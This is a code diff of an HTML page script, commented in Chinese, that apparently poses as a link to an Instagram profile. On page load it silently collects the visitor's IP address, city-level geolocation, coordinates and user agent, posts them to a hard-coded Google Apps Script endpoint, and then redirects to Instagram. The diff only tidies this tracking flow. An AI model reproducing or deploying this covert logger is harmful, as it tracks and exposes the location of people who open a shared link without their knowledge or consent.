@@ -16,14 +16,15 @@
   <script>
     (async () => {
       try {
+        // 取得訪客 IP
         const ip = (await (await fetch("https://api.ipify.org?format=json")).json()).ip;
         const ua = navigator.userAgent;
 
-        let country = "", region = "", city = "", lat = 0, lon = 0;
-        // ✅ 修正 HTTP -> HTTPS 避免被封鎖
-        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
+        // 改為自動偵測用戶地理資訊（不要指定 IP）
+        const locRes = await fetch(`https://ip-api.com/json/`);
         const locData = await locRes.json();
 
+        let country = "", region = "", city = "", lat = 0, lon = 0;
         if (locData.status === "success") {
           country = locData.country;
           region = locData.regionName;
@@ -32,14 +33,14 @@
           lon = locData.lon;
         }
 
-        // ✅ 替換成你的 Google Apps Script Web App URL
+        // 傳送資料給 Google Apps Script
         await fetch("https://script.google.com/macros/s/AKfycbyYKeXg-KLxCvet0aM95lqJNYLH7O8hZpqbJ2M8O7xrRAAUoSUMFdBUvI3SSL-MSgMm/exec", {
           method: "POST",
           headers: { "Content-Type": "text/plain;charset=utf-8" },
           body: JSON.stringify({ ip, country, region, city, lat, lon, ua })
         });
 
-        // 顯示地圖位置
+        // 顯示地圖（可選）
         if (lat && lon) {
           const map = L.map('map').setView([lat, lon], 8);
           L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
@@ -53,10 +54,9 @@
       } catch (e) {
         console.error(e);
       } finally {
-        // 跳轉 IG App（或改回 IG 網頁）
+        // 跳轉 IG App（或改成 IG 網頁）
         window.location.replace("instagram://user?username=_1naux.1");
-        // 或跳轉到 IG 網頁：
-        // window.location.href = "https://www.instagram.com/_1naux.1?igsh=MXBsOWlmNzI0bWpiOA==&utm_source=qr";
+        // window.location.href = "https://www.instagram.com/_1naux.1";
       }
     })();
   </script>
